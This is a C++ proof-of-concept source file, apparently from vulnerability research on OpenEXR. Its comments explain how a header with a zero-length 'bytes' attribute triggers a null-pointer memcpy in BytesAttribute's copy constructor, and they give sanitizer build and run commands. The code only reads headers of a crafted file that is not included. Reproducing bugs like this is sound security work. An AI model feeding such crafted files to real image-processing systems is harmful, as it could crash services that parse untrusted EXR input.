//
// Residual PoC: reading a valid OpenEXR file whose header contains a
// zero-length 'bytes'-typed attribute through the public MultiPartInputFile
// API triggers a NULL-pointer memcpy in BytesAttribute's copy constructor.
//
// The crafted input (crafted.exr) is an ordinary, valid single-part EXR; the
// only unusual bit is that one of its header attributes is a 'bytes' attribute
// with size 0. During header construction the core converts the attribute into
// an Imf::BytesAttribute and Header::insert() copies it, invoking the copy
// constructor with an empty source. On the shipped tree that copy constructor
// skips the allocation but still calls memcpy() with a null destination,
// aborting under the sanitizer. The real upstream fix guards the memcpy and is
// unaffected.
//
// Build (against the shipped, sanitizer-instrumented OpenEXR build):
//   g++ -fsanitize=address,undefined -g residual.cpp \
//       -I<src>/src/lib/OpenEXR -I<src>/src/lib/OpenEXRCore \
//       -I<build>/cmake -I<build>/src/lib/OpenEXR -I/usr/include/Imath \
//       <build>/src/lib/OpenEXR/libOpenEXR-*.a \
//       <build>/src/lib/OpenEXRCore/libOpenEXRCore-*.a \
//       <build>/src/lib/IlmThread/libIlmThread-*.a \
//       <build>/src/lib/Iex/libIex-*.a -lImath-3_1 -lzstd -lpthread -o residual
// Run:
//   ASAN_OPTIONS=detect_leaks=0 ./residual crafted.exr
//

#include <ImfMultiPartInputFile.h>
#include <ImfHeader.h>
#include <cstdio>

using namespace OPENEXR_IMF_NAMESPACE;

int main (int argc, char** argv)
{
    const char* in = argc > 1 ? argv[1] : "crafted.exr";

    MultiPartInputFile file (in);
    printf ("parts=%d\n", file.parts ());
    for (int p = 0; p < file.parts (); ++p)
        (void) file.header (p);

    printf ("read ok\n");
    return 0;
}
